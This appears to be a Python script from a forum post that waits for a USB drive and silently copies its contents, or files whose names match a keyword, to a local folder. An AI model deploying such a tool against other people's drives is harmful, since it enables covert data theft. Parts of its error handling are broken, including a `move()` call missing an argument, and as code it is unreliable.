# -*- coding: utf-8 -*-
# [url=home.php?mod=space&uid=238618]@Time[/url] :   2021/7/10
# [url=home.php?mod=space&uid=686208]@AuThor[/url] : 陈墨
# @Software: PyCharm
# @function: 读取U盘的数据
 
from time import sleep
from shutil import copytree, copyfile, rmtree, move
import os
from psutil import disk_partitions
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
 
 
# 获取U盘的盘符
# disk_partitions() 打印一下他的返回值，就会完全清楚下面这个函数
def get_usb_dispart():
    for item in disk_partitions():
        if item.opts == "rw,removable": # 可读、可移动介质
            logger.info("发现USB：%s" % str(item))
            return item.device
    logger.info("没有发现USB")
    return None
 
 
# 读取想要的文件  u盘所有文件或者文件名含有某个字段的文件及文件夹
# 1、文件夹含有该字段：复制文件夹；
# 2、文件含有字段，复制文件。
def get_useb_file(src, path="", select=None, dst=r"C:\usb"):
    if select is None:# 无筛选规则，复制所有
        copytree(src, dst)
        logger.info("复制%s盘USB所有内容到%s" % (src, dst))
    else: # 复制部分
        paths = os.listdir(os.path.join(src, path)) # 获取当前路径下的所有文件及文件夹
        for item in paths:
            item = os.path.join(path, item)
            if select in item:
                if os.path.isdir(os.path.join(src, item)): #如果是文件夹，还有字符直接复制文件夹；否则递归遍历文件夹下的内容
                    try:
                        copytree(os.path.join(src, item), os.path.join(dst, item))
                    except Exception as e:
                        try:
                            rmtree(os.path.join(dst, item))
                        except:
                            continue
                        copytree(os.path.join(src, item), os.path.join(dst, item))
                else:
                    try:
                        copyfile(os.path.join(src, item), os.path.join(dst, item))
                    except Exception as e:
                        os.makedirs(os.path.dirname(os.path.join(dst, item)))
                        try:
                            move(os.path.join(dst, item))
                        except:
                            continue
                        copyfile(os.path.join(src, item), os.path.join(dst, item))
                logger.info("复制%s 到 %s" % (os.path.join(src, item), (os.path.join(dst, item))))
            else:
                if os.path.isdir(os.path.join(src, item)):
                    get_useb_file(src, item, select, dst)
 
 
if __name__ == "__main__":
    while True:
        path = get_usb_dispart()
        if path is not None:
            get_useb_file(src=path, select="测试", dst=r"F:\usb")
            break
        sleep(1)